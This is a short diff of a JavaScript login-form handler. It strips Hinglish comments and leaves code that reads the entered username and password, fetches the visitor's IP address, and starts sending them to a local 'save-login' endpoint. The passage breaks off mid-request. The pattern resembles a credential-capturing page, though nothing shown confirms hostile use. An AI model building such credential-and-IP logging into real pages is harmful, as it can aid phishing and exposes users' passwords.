@@ -1,21 +1,18 @@
 document.addEventListener('DOMContentLoaded', function() {
     
-    // Yahan hum ID se form dhoond rahe hain (Jo ab HTML mein hai)
     const loginForm = document.getElementById('loginForm');
 
     if (loginForm) {
         loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault(); // Page reload hone se rokega (405 Error Fix)
+            e.preventDefault(); 
 
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
             
-            // Button loading show karega
             const btn = document.querySelector('.login-btn');
             const originalText = btn.innerText;
             btn.innerText = "Please wait...";
 
-            // IP Fetch karna
             let userIP = "Unknown";
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -25,7 +22,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.log("IP fetch failed");
             }
 
-            // Server ko Data bhejo
             try {
                 const response = await fetch('http://localhost:3000/save-login', {
                     method: 'POST',
